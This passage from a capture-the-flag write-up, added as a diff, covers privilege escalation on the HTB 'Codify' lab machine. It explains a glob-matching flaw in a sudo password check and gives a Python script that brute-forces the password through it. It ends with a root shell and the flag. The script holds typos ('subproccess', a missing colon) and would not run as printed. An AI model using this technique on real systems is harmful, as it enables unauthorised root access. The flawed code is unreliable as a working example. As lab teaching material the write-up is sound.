@@ -305,3 +305,80 @@ else
     exit 1
 fi
 ```
+
+The vulnerability in this script lies in the comparison between the user-provided password (USER_PASS) and the actual database password (DB_PASS). The issue arises from the use of == inside [[ ]] in Bash, which performs pattern matching instead of a direct string comparison. Consequently, the user input (USER_PASS) is treated as a pattern, and if it contains glob characters like * or ?, it may unintentionally match with other strings.
+
+For instance, if the actual password (DB_PASS) is "password123," and the user enters * as their password (USER_PASS), the pattern match would succeed because * matches any string. This could potentially lead to unauthorized access.
+
+Exploiting this vulnerability, an attacker could employ a brute-force attack to try every character in the DB_PASS until a match is found.
+
+## Exploiting the Pattern Matching Vulnerability:
+
+I crafted a Python script to take advantage of this weakness by systematically testing password prefixes and suffixes, gradually unveiling the complete password.
+
+The script incrementally constructs the password character by character, validating each guess by executing the script through sudo and verifying the success of each attempt.
+
+```bash
+
+import string
+import subproccess
+
+def check_password(p):
+	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
+	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)
+	return "Password confirmed!" in result.stdout
+
+charset = string.ascii_letters + string.digits
+password = ""
+is_password_found = False
+
+while not is_password_found:
+	for char in charset:
+		if check_password(password + char)
+			password += char
+			print(password)
+			break
+	else:
+		is_password_found = True
+
+```
+
+
+https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/6651cd98-3a1a-4501-a457-39bbd31ac187
+
+__Great! we got the root password. Let’s escalate our privilege. Finally I got the root flag.__
+
+## Gaining Root Shell Using su:
+
+Having obtained the backup password, I successfully utilized su to transition to the root user. 
+
+```bash
+
+joshua@codify:/tmp$ su root
+Password:
+root@codify:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@codify:/tmp# ls -la ~
+total 40
+drwx------  5 root root 4096 Sep 26 09:35 .
+drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..
+lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+-rw-r--r--  1 root root   22 May  8  2023 .creds
+drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local
+lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Nov 14 07:14 root.txt
+drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts
+drwx------  2 root root 4096 Sep 14 03:31 .ssh
+-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
+root@codify:/tmp# cat ~/root.txt
+8070f26ea2ef1c9c874c60f03051689c
+
+```
+
+
+
+
+
+
